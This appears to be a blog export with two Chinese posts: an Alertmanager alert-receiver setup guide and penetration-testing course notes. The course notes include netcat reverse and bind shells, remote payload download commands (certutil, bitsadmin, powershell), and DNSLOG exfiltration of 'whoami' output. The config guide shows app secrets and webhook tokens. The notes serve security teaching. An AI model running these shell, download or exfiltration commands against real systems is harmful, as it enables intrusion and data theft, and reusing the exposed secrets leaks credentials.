四.警报通知接收器Email前面已经讲过，Alertmanager默认支持配置Email，也是最普通的方式，在Alertmanager组件中内置了SMTP协议。直接可以把前面的Alertmanager.yml中的SMTP部分截取出来，然后进行调整与配置
global:  resolve_timeout: 5m  # smtp配置  smtp_from: &quot;1234567890@qq.com&quot; # 发送邮件主题  smtp_smarthost: &#x27;smtp.qq.com:465&#x27; # 邮箱服务器的SMTP主机配置  smtp_auth_username: &quot;1234567890@qq.com&quot; # 登录用户名  smtp_auth_password: &quot;auth_pass&quot; # 此处的auth password是邮箱的第三方登录授权密码，而非用户密码，尽量用QQ来测试。  smtp_require_tls: false # 有些邮箱需要开启此配置，这里使用的是163邮箱，仅做测试，不需要开启此功能。route:  receiver: ops  group_wait: 30s # 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。  group_interval: 5m # 如果组内内容不变化，合并为一条警报信息，5m后发送。  repeat_interval: 24h # 发送报警间隔，如果指定时间内没有修复，则重新发送报警。  group_by: [alertname]  # 报警分组  routes:      - match:          team: operations        group_by: [env,dc]        receiver: &#x27;ops&#x27;      - receiver: ops # 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 ops 来发送        group_wait: 10s        match:          team: operations# 接收器指定发送人以及发送渠道receivers:# ops分组的定义- name: ops  email_configs:  - to: &#x27;9935226@qq.com,xxxxx@qq.com&#x27; # 如果想发送多个人就以 &#x27;,&#x27;做分割，写多个邮件人即可。    send_resolved: true    headers:      from: &quot;警报中心&quot;      subject: &quot;[operations] 报警邮件&quot;      to: &quot;小煜狼皇&quot;


企业微信第一步登录进入以后，在应用管理中新建应用。

第二步，创建应用，信息填写如下，上传应用logo随意。

创建成功以后如下图。

微信应用信息
这时候需要把 AgentId 和 Secret 记录下来，对于你的这种Secret信息，最好管理好，我的用过就会删除，所以不用担心安全隐患。



ID
key



AgentId
1000004


Secret
F-fzpgsabmfiFt7_4QRQwWEl8eyx7evO12sRYe_Q5vA


第三步，现在我们来用新建的企业微信应用在Alertmanager配置，可以配置全局，也可以对单独需要发送的接收器，因为警报需要分级，所以需要单独处理，在这里使用的的单独的配置，需要知道 企业ID ，以及 部门ID 。
企业ID 通过

部门ID 通过通讯录获取

这时候我们重启Alertmanager，然后使用之前的方式来触发模拟警报，看看发送是不是已经没有问题了，这时我们的企业微信中、Email都可以收到警报了，这里的警报已经被我用模块处理过了。可读性会更高。
cat wechat.tmpl## wechat模板&#123;&#123; define &quot;wechat.default.message&quot; &#125;&#125;&#123;&#123; if gt (len .Alerts.Firing) 0 -&#125;&#125;Alerts Firing:&#123;&#123; range .Alerts &#125;&#125;警报级别：&#123;&#123; .Labels.status &#125;&#125;警报类型：&#123;&#123; .Labels.alertname &#125;&#125;故障主机: &#123;&#123; .Labels.instance &#125;&#125;警报主题: &#123;&#123; .Annotations.summary &#125;&#125;警报详情: &#123;&#123; .Annotations.description &#125;&#125;⏱ : &#123;&#123; (.StartsAt.Add 28800e9).Format &quot;2006-01-02 15:04:05&quot; &#125;&#125;&#123;&#123;- end &#125;&#125;&#123;&#123;- end &#125;&#125;&#123;&#123; if gt (len .Alerts.Resolved) 0 -&#125;&#125;Alerts Resolved:&#123;&#123; range .Alerts &#125;&#125;警报级别：&#123;&#123; .Labels.status &#125;&#125;警报类型：&#123;&#123; .Labels.alertname &#125;&#125;故障主机: &#123;&#123; .Labels.instance &#125;&#125;警报主题: &#123;&#123; .Annotations.summary &#125;&#125;警报详情: &#123;&#123; .Annotations.description &#125;&#125;⏱ : &#123;&#123; (.StartsAt.Add 28800e9).Format &quot;2006-01-02 15:04:05&quot; &#125;&#125;⏲ : &#123;&#123; (.EndsAt.Add 28800e9).Format &quot;2006-01-02 15:04:05&quot; &#125;&#125;&#123;&#123;- end &#125;&#125;&#123;&#123;- end &#125;&#125;&#123;&#123;- end &#125;&#125;

钉钉机器人Prometheus-webhook-Dingtalk组件
mkdir -p /etc/prometheus-webhook-dingtalk/template/cd /etc/prometheus-webhook-dingtalk/wget https://github.com/timonwong/prometheus-webhook-dingtalk/releases/download/v1.4.0/prometheus-webhook-dingtalk-1.4.0.linux-amd64.tar.gztar xf prometheus-webhook-dingtalk-1.4.0.linux-amd64.tar.gzmv prometheus-webhook-dingtalk-1.4.0.linux-amd64/* /etc/prometheus-webhook-dingtalk/mv prometheus-webhook-dingtalk /bin/cat &lt;&lt;EOF&gt; /lib/systemd/system/prometheus-webhook-dingtalk.service [Unit]Description=prometheus-webhook-dingdingDocumentation=https://prometheus.io/After=network.target[Service]Type=simpleUser=prometheusExecStart=/bin/prometheus-webhook-dingtalk --web.listen-address=&quot;:8070&quot; --web.enable-ui --config.file=&quot;/etc/prometheus-webhook-dingtalk/config.yml&quot;Restart=on-failure[Install]WantedBy=multi-user.targetEOF## 启动服务systemctl enable prometheus-webhook-dingtalk.servicesystemctl start prometheus-webhook-dingtalk.service

配置文件
## Request timeout# timeout: 5s## Customizable templates path## Customizable templates pathtemplates:        # - contrib/templates/legacy/template.tmpl  # 自定义模板路径  - /etc/prometheus-webhook-dingtalk/template/default.tmpl## 你还可以使用&#x27; default_message &#x27;覆盖默认模板## 下面的示例使用v0.3.0中的“legacy”模板# default_message:#   title: &#x27;&#123;&#123; template &quot;legacy.title&quot; . &#125;&#125;&#x27;#   text: &#x27;&#123;&#123; template &quot;legacy.content&quot; . &#125;&#125;&#x27;## Targets, previously was known as &quot;profiles&quot;# 定义的webhook，钉钉创建的webhook tokentargets:# 如果有多个分组就可以在这里定义多个接口  ops:    url: https://oapi.dingtalk.com/robot/send?access_token=a4feed2322222222222222222222222  web:    url: https://oapi.dingtalk.com/robot/send?access_token=a4feed2325c1333333333333333333333

定义模板
cd /etc/prometheus-webhook-dingtalk/templatecat default.tmpl&#123;&#123; define &quot;__subject&quot; &#125;&#125;[&#123;&#123; .Status | toUpper &#125;&#125;&#123;&#123; if eq .Status &quot;firing&quot; &#125;&#125;:&#123;&#123; .Alerts.Firing | len &#125;&#125;&#123;&#123; end &#125;&#125;] &#123;&#123; .GroupLabels.SortedPairs.Values | join &quot; &quot; &#125;&#125; &#123;&#123; if gt (len .CommonLabels) (len .GroupLabels) &#125;&#125;(&#123;&#123; with .CommonLabels.Remove .GroupLabels.Names &#125;&#125;&#123;&#123; .Values | join &quot; &quot; &#125;&#125;&#123;&#123; end &#125;&#125;)&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; define &quot;__alertmanagerURL&quot; &#125;&#125;&#123;&#123; .ExternalURL &#125;&#125;/#/alerts?receiver=&#123;&#123; .Receiver &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; define &quot;__text_alert_list&quot; &#125;&#125;&#123;&#123; range . &#125;&#125;**Labels**&#123;&#123; range .Labels.SortedPairs &#125;&#125;&gt; - &#123;&#123; .Name &#125;&#125;: &#123;&#123; .Value | markdown | html &#125;&#125;&#123;&#123; end &#125;&#125;**Annotations**&#123;&#123; range .Annotations.SortedPairs &#125;&#125;&gt; - &#123;&#123; .Name &#125;&#125;: &#123;&#123; .Value | markdown | html &#125;&#125;&#123;&#123; end &#125;&#125;**Source:** [&#123;&#123; .GeneratorURL &#125;&#125;](&#123;&#123; .GeneratorURL &#125;&#125;)&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123;/* Firing */&#125;&#125;&#123;&#123; define &quot;default.__text_alert_list&quot; &#125;&#125;&#123;&#123; range . &#125;&#125;**Trigger Time:** &#123;&#123; dateInZone &quot;2006.01.02 15:04:05&quot; (.StartsAt) &quot;Asia/Shanghai&quot; &#125;&#125;**Summary:** &#123;&#123; .Annotations.summary &#125;&#125;**Description:** &#123;&#123; .Annotations.description &#125;&#125;**Graph:** [📈 ](&#123;&#123; .GeneratorURL &#125;&#125;)**Details:**&#123;&#123; range .Labels.SortedPairs &#125;&#125;&#123;&#123; if and (ne (.Name) &quot;severity&quot;) (ne (.Name) &quot;summary&quot;) &#125;&#125;&gt; - &#123;&#123; .Name &#125;&#125;: &#123;&#123; .Value | markdown | html &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123;/* Resolved */&#125;&#125;&#123;&#123; define &quot;default.__text_resolved_list&quot; &#125;&#125;&#123;&#123; range . &#125;&#125;**Trigger Time:** &#123;&#123; dateInZone &quot;2006.01.02 15:04:05&quot; (.StartsAt) &quot;Asia/Shanghai&quot; &#125;&#125;**Resolved Time:** &#123;&#123; dateInZone &quot;2006.01.02 15:04:05&quot; (.EndsAt) &quot;Asia/Shanghai&quot; &#125;&#125;**Summary:** &#123;&#123; .Annotations.summary &#125;&#125;**Graph:** [📈 ](&#123;&#123; .GeneratorURL &#125;&#125;)**Details:**&#123;&#123; range .Labels.SortedPairs &#125;&#125;&#123;&#123; if and (ne (.Name) &quot;severity&quot;) (ne (.Name) &quot;summary&quot;) &#125;&#125;&gt; - &#123;&#123; .Name &#125;&#125;: &#123;&#123; .Value | markdown | html &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123;/* Default */&#125;&#125;&#123;&#123; define &quot;default.title&quot; &#125;&#125;&#123;&#123; template &quot;__subject&quot; . &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; define &quot;default.content&quot; &#125;&#125;#### \[&#123;&#123; .Status | toUpper &#125;&#125;&#123;&#123; if eq .Status &quot;firing&quot; &#125;&#125;:&#123;&#123; .Alerts.Firing | len &#125;&#125;&#123;&#123; end &#125;&#125;\] **[&#123;&#123; index .GroupLabels &quot;alertname&quot; &#125;&#125;](&#123;&#123; template &quot;__alertmanagerURL&quot; . &#125;&#125;)**&#123;&#123; if gt (len .Alerts.Firing) 0 -&#125;&#125;![Firing-img](https://is3-ssl.mzstatic.com/image/thumb/Purple20/v4/e0/23/cf/e023cf56-0623-0cdf-afce-97ae90eabfda/mzl.uplmrpgi.png/320x0w.jpg)**Alerts Firing**&#123;&#123; template &quot;default.__text_alert_list&quot; .Alerts.Firing &#125;&#125;&#123;&#123;- end &#125;&#125;&#123;&#123; if gt (len .Alerts.Resolved) 0 -&#125;&#125;![Resolved-img](https://is3-ssl.mzstatic.com/image/thumb/Purple18/v4/41/72/99/4172990a-f666-badf-9726-6204a320c16e/mzl.dypdixoy.png/320x0w.png)**Alerts Resolved**&#123;&#123; template &quot;default.__text_resolved_list&quot; .Alerts.Resolved &#125;&#125;&#123;&#123;- end &#125;&#125;&#123;&#123;- end &#125;&#125;&#123;&#123;/* Legacy */&#125;&#125;&#123;&#123; define &quot;legacy.title&quot; &#125;&#125;&#123;&#123; template &quot;__subject&quot; . &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; define &quot;legacy.content&quot; &#125;&#125;#### \[&#123;&#123; .Status | toUpper &#125;&#125;&#123;&#123; if eq .Status &quot;firing&quot; &#125;&#125;:&#123;&#123; .Alerts.Firing | len &#125;&#125;&#123;&#123; end &#125;&#125;\] **[&#123;&#123; index .GroupLabels &quot;alertname&quot; &#125;&#125;](&#123;&#123; template &quot;__alertmanagerURL&quot; . &#125;&#125;)**&#123;&#123; template &quot;__text_alert_list&quot; .Alerts.Firing &#125;&#125;&#123;&#123;- end &#125;&#125;&#123;&#123;/* Following names for compatibility */&#125;&#125;&#123;&#123; define &quot;ding.link.title&quot; &#125;&#125;&#123;&#123; template &quot;default.title&quot; . &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; define &quot;ding.link.content&quot; &#125;&#125;&#123;&#123; template &quot;default.content&quot; . &#125;&#125;&#123;&#123; end &#125;&#125;

在alertmanager中配置警报让三个报警报警
# 接收器指定发送人以及发送渠道receivers:# ops分组的定义- name: ops  email_configs:  - to: &#x27;9935226@qq.com,10000@qq.com&#x27;    send_resolved: true    headers: &#123; Subject: &quot;[operations] 报警邮件&quot;&#125; # 接收邮件的标题  # 钉钉配置  webhook_configs:  - url: http://localhost:8070/dingtalk/ops/send # 这里是在钉钉开源组件中的接口，如果单独定义的receiver需要对应你的分组与钉钉机器人的webhook token    # 企业微信配置  wechat_configs:  - corp_id: &#x27;ww5421dksajhdasjkhj&#x27;    api_url: &#x27;https://qyapi.weixin.qq.com/cgi-bin/&#x27;    send_resolved: true    to_party: &#x27;2&#x27;    agent_id: &#x27;1000002&#x27;    api_secret: &#x27;Tm1kkEE3RGqVhv5hO-khdakjsdkjsahjkdksahjkdsahkj&#x27;# web- name: web  email_configs:  - to: &#x27;9935226@qq.com&#x27;    send_resolved: true    headers: &#123; Subject: &quot;[web] 报警邮件&quot;&#125; # 接收邮件的标题  webhook_configs:  - url: http://localhost:8070/dingtalk/web/send

报警规则vi prometheus-rules.yaml

]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>Prometheus</tag>
      </tags>
  </entry>
  <entry>
    <title>小迪安全--基础讲解(1)</title>
    <url>/posts/e1dc7286.html</url>
    <content><![CDATA[WEB服务搭建方式常规化搭建​	原理：直接将源码、中间件、数据库搭建在同一个服务器
​	影响：无，使用常规的渗透测试方法即可
站库分离​	原理：源码和数据库不在同一个服务器
​	影响：数据被单独存放，能连接才可影响数据；比较安全
前后端分离​	原理：前端JS框架，通过API传输数据
​	影响：
​		前端页面大部分不存在漏洞
​		后端管理大部分不在同域名
​		获得权限有可能不影响后端
集成软件搭建​	原理：打包类的集成化环境。权限配置或受控制
​	影响：
​		默认情况下，使用phpstudy搭建获得的webshell的权限较大
​		使用灯塔搭建的网站，具有一定的安全机制
使用WAF搭建WAF：WEB应用防火墙

影响：
​	常规的渗透方法可能被拦截，需要使用绕过WAF手法进行绕过
使用CDN原理：内容分发服务，用户访问Web网站提供多地域响应，提高访问速度
影响：隐藏真实源IP，导致对目标测试错误
使用OSS存储桶原理：提供对象存储服务
使用方式：
​	1、开通OSS
​	2、新建Bucket
​	3、配置Bucket属性
​	4、配置Access访问
影响：上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储    1、修复上传安全    2、文件解析不一样    3、但存在Accesskey隐患
负载均衡负载均衡就是一种计算机网络技术，用来在多个计算机（计算机集群）、网络连接、CPU、磁碟驱动器或其他资源中分配负载，以达到最佳化资源使用、最大化吞吐率、最小化响应时间、同时避免过载的目的。
原理：分摊到多个操作单元上进行执行，共同完成工作任务
影响：有多个服务器加载服务，测试过程中存在多个目标情况

正反向代理
正向代理正向代理是一种位于客户端和原始服务器之间的服务器，它接收客户端的请求并将其转发给原始服务器，然后将服务器的响应返回给客户端（不代理不可达）

​	
2反向代理通过网络反向代理转发真实服务达到访问目的影响：访问目标只是一个代理，非真实应用服务器

原理：通过网络反向代理转发真实服务达到访问目的影响：访问目标只是一个代理，非真实应用服务器
注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！
APP应用开发架构1、原生开发
安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。
2、使用H5语言开发
使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。结合我做过的项目来说，一般是这个页面需要分享出去的话，就用H5开发。
3、使用flutter开发
flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。
4、常规Web开发
Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。
#APP-开发架构-原生态-IDEA
演示：remusic项目源码
安全影响：反编译&amp;抓包&amp;常规测试
安全影响：逆向的角度去分析逻辑设计安全
#APP-开发架构–Web封装-封装平台
演示：ShopXO源码程序+一门APP打包
安全影响：常规Web安全测试
#APP-开发架构-H5&amp;Vue-HBuilderX
演示：HBuilderX案例
安全影响：API&amp;JS框架安全问题&amp;JS前端测试
#WX小程序-开发架构-Web封装-平台
演示：ShopXO源码程序+一门APP打包
安全影响：常规Web安全测试
#WX小程序-开发架构-H5&amp;Vue-HBuilderX
演示：HBuilderX案例
安全影响：API&amp;JS框架安全问题&amp;JS前端测试
反弹SHELL（攻击者视角）
正向连接：客户端进行监听本地端口，攻击者主动发送请求与客户端建立连接
反向连接：攻击者进行监听本地端口，客户端主动发送请求与攻击者建立连接
命令生成：https://forum.ywhack.com/shell.php
新版反弹：https://forum.ywhack.com/reverse-shell/
eg.Linux控制windows
①正向连接：
Linux： nc 192.168.138.130 5566
windows：nc -e cmd -lvvp 5566


②反向连接：
Linux： nc -lvvp 5566
Windows：nc -e cmd 192.168.138.141 5566


防火墙出入站①当防火墙入站规则被进行过滤
阻止5566端口的入站规则
思路：攻击者监听本地端口，客户端主动连接攻击者
client：nc.exe -e cmd 192.168.138.141 5566
hacker：nc -lvvp 5566




注意：防火墙默认对出站过滤检测并不严格，对入站规则过滤检测较为严格（默认阻止入站连接，默认允许出站连接）
②当防火墙出站规则被进行过滤
阻止5566端口的出站规则（前提条件：允许5566的入站规则）
思路：客户端监听本地端口，攻击者主动连接客户端
client：nc.exe -e cmd -lvvp 5566
hacker：nc 192.168.138.132 5566	

文件下载文件下载命令生成：https://forum.ywhack.com/bountytips.php?download
Linux：wget curl python ruby perl java 等
Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等
Windows常用：
​	
powershell.exe -Command &quot;Invoke-WebRequest -Uri http://127.0.0.1:8080/test.exe -OutFile exploit.exe&quot;certutil.exe -urlcache -split -f http://127.0.0.1:8080/test.exe exploit.exebitsadmin /rawreturn /transfer down &quot;http://127.0.0.1:8080/test.exe&quot; c:\\exploit.exemsiexec /q /i http://127.0.0.1:8080/test.exe





Linux常用：
wget http://127.0.0.1:8080/test.exe -O exploit.execurl http://127.0.0.1:8080/test.exe -o exploit.exe



数据不回显
使用数据访问外部DNSLOG的方式外带
常用dnslog：

http://ceye.io
http://www.dnslog.cn/
http://eyes.sh/dns/

管道符：| (管道符号) ||（逻辑或） &amp;&amp;（逻辑与） &amp;(后台任务符号)	Windows-&gt;| &amp; || &amp;&amp;	Linux-&gt;; | || &amp; &amp;&amp; ``(特有``和;)



Linux常用外带方法：
curl http://haha.xxx.ceye.io/`whoami`ping `whoami`.xxxx.ceye.ioping $(whoami).dyy8n3.dnslog.cnwhois -h 192.168.233.128 -p 8888 `whoami`



Windows外带方法：
ping %USERNAME%.GoldY.eyes.shfor /F &quot;delims=\&quot; %i in (&#x27;whoami&#x27;) do ping %i.91pjgw.dnslog.cn#需要vpc开启一个http服务for /F &quot;delims=&quot; %i in (&#x27;whoami&#x27;) do curl http://192.168.43.190:8000/%i







编码与加解密编码https://www.inkomet.com/detail.php?id=MQ==
进行测试的的语句：
https://www.inkomet.com/detail.php?id=2 ——–&gt;  没有正确的回显
https://www.inkomet.com/detail.php?id=Mg== ———&gt; 正确回显
数据在传输的时候进行编码 为什么要了解?
服务器在接受参数的可能会进行解码再带入，如果payload没有进行同样的编码，出入后端的数据就无法进行有效的测试
正确:测试的话也要进行pay1oad同样的加密或编码进行提交
安全测试漏洞时候 通常都会进行数据的修改增加提交测试
场景：登录的数据包
admin 123456
username&#x3D;admin&amp;password&#x3D;e10adc3949ba59abbe56e057f20f883e如果现在我要进行密码的破解爆破
字典文件:    帐号什么都不用更改 去替换username&#x3D;值即可
​	密码需要进行密码算法 保证和password&#x3D;值同等加密才行
加解密针对对象WEB传输数据：
​	加密：md5
​	编码：base64
通常根据数据加密或编码的数据，进行相应payload加密或编码后，进行漏洞探测发现（漏洞探针）
数据格式：	

常规方式
JSON
XML

在数据包使用不同数据格式时候，需要对payload进行相应的数据格式转换（发送漏洞探针，回显数据分析）
产品
不同的web网站可能采用的数据方式并不一致：如CMS Discuz不同版本采用不同的加密方式（MD5+salt、使用password_hash()函数进行加密）
密文存储加密方式：

MD5
MD5+SALT
AES
DES

系统只要针对后测试
1、Windows
在Win10之前（包括win10）使用的用户密码加密方式为NTML
2、Linux
使用的是md5+salt方式进行存储用户密码
一般情况难以进行破解
代码
java
.net
安卓
ios

有时为了保护源代码可能会对代码进行二次加密
千古互动 免费PHP加密 - SG11,SG13,SG14,SG15,Phpencode.cn,SG11加密平台,PHP加密平台,免费PHP加密,PHP在线加密
php在线混淆加密,支持php5和php7代码在线加密混淆-在线工具网

逆向思路1、看密文的特征分析算法
2、获取源码分析算法（后端加密）
3、JS前端进行加密（前端加密）
识别并解密

单向散列加密 -MD5单向散列加密算法的优点有(以MD5为例)：方便存储，损耗低：加密&#x2F;加密对于性能的损耗微乎其微。单向散列加密的缺点就是存在暴力破解的可能性，最好通过加盐值的方式提高安全性，此外可能存在散列冲突。我们都知道MD5加密也是可以破解的。常见的单向散列加密算法有：MD5 SHA MAC CRC

对称加密 -AES对称加密优点是算法公开、计算量小、加密速度快、加密效率高。缺点是发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。常见的对称加密算法有：DES AES RC4

非对称加密 -RSA非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。常见的非对称加密算法：RSA RSA2 PKCS



MD5密文特点：1、由数字“0-9”和字母“a-f”所组成的字符串2、固定的位数 16 和 32位解密需求：密文即可，但复杂明文可能解不出
BASE64编码特点：0、大小写区分，通过数字和字母的组合1、一般情况下密文尾部都会有两个等号，明文很少的时候则没有2、明文越长密文越长，一般不会出现”&#x2F;“”+”在密文中
AES、DES密文特点：同BASE64基本类似，但一般会出现”&#x2F;“和”+”在密文中解密需求：密文，模式，加密Key，偏移量，条件满足才可解出
RSA密文特点：特征同AES,DES相似，但是长度较长解密需求：密文，公钥或私钥即可解出
​	
数据传输格式在进行安全测试时，通过使用抓包工具进行抓包，必须按照目标系统的数据格式发送数据，否则会导致测试无效。
常规格式username=admin&amp;password=e10adc3949ba59abbe56e057f20f883e



最常使用的数据包传输格式，使用&amp;符号进行连接不同的参数值
JSON&#123;  &quot;id&quot;: &quot;10&quot;,  &quot;name&quot;: &quot;课程&quot;,  &quot;items&quot;: [	&#123;&quot;itemId&quot;: &quot;20&quot;, &quot;itemName&quot;: &quot;数学&quot;&#125;,	&#123;&quot;itemId&quot;: &quot;21&quot;, &quot;itemName&quot;: &quot;化学&quot;&#125;  ]&#125;

JSON是一种轻量级的数据交换格式，易于阅读和编写，广泛应用于Web应用程序中。它的优点包括易于解析和生成，支持多种编程语言，数据结构简单且可嵌套。然而，JSON的数据体积相对较大。
XML&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;students&gt;&lt;student id=&quot;001&quot;&gt;&lt;name&gt;微信1&lt;/name&gt;&lt;学号&gt;20140101&lt;/学号&gt;&lt;地址&gt;广州&lt;/地址&gt;&lt;座右铭&gt;要么强大，要么听话&lt;/座右铭&gt;&lt;/student&gt;&lt;student id=&quot;002&quot;&gt;&lt;name&gt;微博1&lt;/name&gt;&lt;学号&gt;20140102&lt;/学号&gt;&lt;地址&gt;广州&lt;/地址&gt;&lt;座右铭&gt;在哭泣中学会坚强&lt;/座右铭&gt;&lt;/student&gt;&lt;/students&gt;

XML是一种可扩展的标记语言，用于描述和传输结构化数据，常用于Web服务和配置文件中。它具有自我描述性和可扩展性，适用于复杂数据结构和文档的交换。然而，XML标签冗余，数据体积较大，解析和生成相对复杂。
HTTP数据包HTTP请求方法利用HTTP访问网站都有哪些请求方法，请求方法对应特点？GET: 		直接获取网站资源POST：		客户端有信息要提交到服务端时（登录 搜索）HEAD:		类似GET方法，不会返回响应主体信息PUT：		用来将本地资源上传到服务端OPTIONS:	用来检测服务端可以接收哪些访问请求（安全）TRACE:		可以在响应报文中，看到请求报文的内容	
HTTP请求报文信息

第一部分：请求行信息1）请求方法信息：GET POST PUT HEAD …2）请求资源信息：   host（访问网站域名&#x2F;地址&#x2F;端口）+请求资源   host: 确认访问站点目录   请求资源：三种情况   1 正常请求资源- oldboy.jpg   2 默认请求-&#x2F; &#x2F;admin&#x2F; 请求首页文件-index.html index.php index.jsp   3 访问代码资源需要传入参数
   协议（HTTP&#x2F;HTTPS&#x2F;FTP）+host（访问网站域名&#x2F;地址&#x2F;端口）+请求资源  – 请求信息 &#x3D;&#x3D; URL
   URL(Uniform Resource Locator，统一资源定位符),是标识Web资源的唯一标识符.通过它即可获取其标识的资源。
3）请求HTTP版本信息（1.1 2.0）1.0 属于TCP短连接访问  		一次连接对应一次请求1.1 属于TCP长连接访问  		一次连接对应多次请求2.0 可以实现并发请求处理    适合电商网站
第二部分：请求头信息请求过程各种字段信息：Accept: 	确认客户端请求资源类型信息Referer：	消息头用于表示发出请求的原始URL；告知服务端是从哪访问过来的	（*****）            有referer：可以获得跳转源url地址信息（记录推广次数）            无referer：代表直接访问网站资源
        视频网站：视频无法下载 会员登录 http://www.aiqiyi.com/vip/xxx  -- vip电影 
                                         http://www.aiqiyi.com/            vip电影6分钟
                                         
        修改请求信息：添加referer：http://www.aiqiyi.com/vip/xxx  

Accept-Language：请求返回语言字符信息User-Agent：消息头提供与浏览器或其他生成请求的客户端软件有关的信息；获取客户端指纹信息&#x2F;客户端访问浏览器信息（）Accept-Encoding：浏览器支持的压缩编码是 gzip 和 deflateCookie：消息头用于提交服务器向客户端发布的其他参数							（）        HTTP属于无状态访问方式，不会记录访问者的身份信息，都需要输入用户名和密码        利用cooke记住用户访问情况：避免反复登录网站
    cookie类型：
    会话cookie：临时产生或短期应用
    长期cookie：一般互联网网站
    
    cookie属性：
    secure：	如果设置这个属性.则仅在HTTPS请求中提交cookie.  （*****）
    Httponly：	如果设置这个属性，将无法通过客户端JavaScript直接访问cookie.
                
                服务 识别用户访问行为  
                抖音网站 -- cookie 123
                cookie 123 视频--美女   记录123 美女 
                cookie 123 视频--美女   记录123 美女
                cookie 123 视频--美女   记录123 美女  
                推广 美女居多  体育  jd 苹果电脑 -- 苹果

Connection：     表示持久的客户端与服务连接；定义客户端与服务建立TCP连接方式（短连接&#x2F;长连接）X_FORWARDED_FOR：可以获取真实客户端IP地址信息；可以伪装自己客户端地址；                 请求头里面添加X_FORWARDED_FOR                 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段
空行第三个部分：请求主体信息一般是利用post方法进行请求时，会含有请求主体信息（默认HTTP访问会已明文信息显示）
HTTP响应报文信息第一个部分：响应行（起始行）信息1）HTTP&#x2F;1.1 响应的HTTP协议版本信息2）200 状态码：返回请求结果   常用状态码分类：   1xx：提供信息（需要客户端提供信息）   2xx：请求被成功提交，并能够正确处理请求   3xx：客户端被重定向到其他资源	（重要部分）   4xx：请求包含某种错误			（客户端请求异常） – 显示错误页面   5xx：服务器执行请求时遇到错误	（服务端响应异常） – 检查服务端配置
   常用状态有什么：面试问到   100 Continue：			表示服务端收到了客户端的请求信息（POST），但是没有收到请求主体信息   200 OK:					本状态码表示已成功提交请求，且响应主体中包含请求结果。   201 Created:				客户端进行PUT请求时，有数据文件上传到服务端成功后，会响应201状态码信息   301 Moved Permanently：	本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。   302 Found				本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL.    PS：网站页面跳转，可以对协议 对域名 对资源信息做跳转处理，以便用户在访问旧的资源信息时，可以获取到新的资源信息   304 Not Modified。       本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与工If-None-Match消息头确定客户端是否拥有最新版本的资源。
   401 Unauthorized.		服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。                            参考链接：https://blog.csdn.net/chj_1224365967/article/details/113946038                            第一步：编写配置文件                            第二步：创建用户密码文件                            第三步：重启nginx							 403 Forbidden			本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。                            参考链接：https://blog.csdn.net/yxhxj2006/article/details/121623574                            访问首页文件不存在，也会出现此状态码 404 Not Found。			本状态码表示所请求的资源并不存在。 405 Method Not Allowed	本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。                            服务端做了请求方法限制
   500 Internal Server Error	本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输人、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。                                应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。                                PS：检查访问网站代码逻辑（代码审计） 503 Service Unavailable。	通常，本状态码表示尽管Web服务器运转正常.并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。   502                          PS：需要访问后端数据库服务，但是后端数据库服务没有响应
第二个部分：响应头信息
第三个部分：响应主体信息响应HTML代码信息，浏览器识别HTML代码加载页面
跨平台测试注意事项在不同终端测试时，必须保证数据包结构与目标平台完全一致
eg.不同的设备访问同一web界面返回不一致

移动设备和PC访问同一接口可能返回不同数据

识别依据：User-Agent字段是主要设备标识

解决方法修改请求头模拟移动设备访问

需要完整复制移动端的请求头参数
特别是Android版本和设备型号信息
缺少移动端特有参数会导致403错误



根据状态码判断是否存在该文件或路径

文件存在判断：返回200表示文件存在且可访问；返回404表示文件不存在。
